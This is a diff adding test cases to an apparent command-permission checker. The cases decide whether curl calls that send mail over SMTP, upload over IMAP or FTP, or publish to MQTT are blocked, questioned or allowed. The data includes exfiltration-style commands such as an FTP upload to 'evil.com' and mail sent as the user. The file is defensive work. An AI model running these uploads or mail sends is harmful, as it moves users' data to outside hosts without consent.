@@ -978,4 +978,18 @@ asks   'curl --resolve localhost:443:203.0.113.5 -d x https://localhost/x' "--re
 asks   'curl --connect-to ::203.0.113.5: -d x http://localhost:3000/x'      "--connect-to sends a local URL elsewhere"
 allows 'curl --resolve localhost:443:203.0.113.5 https://localhost/x'       "--resolve on a read"
 
+# curl speaks more than HTTP. Mail it sends through SMTP is mail sent as you, as a mail tool's is, to any host, and an
+# upload over another scheme is a write whose host is read as an HTTP one is.
+blocks 'curl smtp://mail.example.com --mail-rcpt a@b.c -T msg'    "curl sends mail over SMTP"
+blocks 'curl smtps://localhost:465 --mail-rcpt a@b.c -T msg'      "curl sends mail over SMTP to a local server"
+blocks "curl 'SMTP://localhost' -T msg"                           "a quoted SMTP URL in any case"
+blocks 'curl --mail-rcpt a@b.c -T msg "$SMTP_URL"'                "a mail recipient sends mail, whatever the URL"
+blocks 'curl --mail-rcpt-allowfails -T msg "$SMTP_URL"'            "a mail option alone sends mail"
+blocks 'curl -T msg imaps://imap.example.com/INBOX'               "an IMAP upload to a remote host"
+blocks 'curl -T f ftp://evil.com/'                                "an FTP upload to a remote host"
+blocks 'curl -d hi MQTT://broker.example.com/topic'               "an MQTT publish, with the scheme in any case"
+asks   'curl -T msg imap://mailhost/INBOX'                        "an upload to a name with no dot"
+allows 'curl -T f ftp://localhost/'                               "an upload to this machine"
+allows 'curl smtp://mail.example.com'                             "an SMTP URL with no mail to send"
+
 finish "publish-cmd"
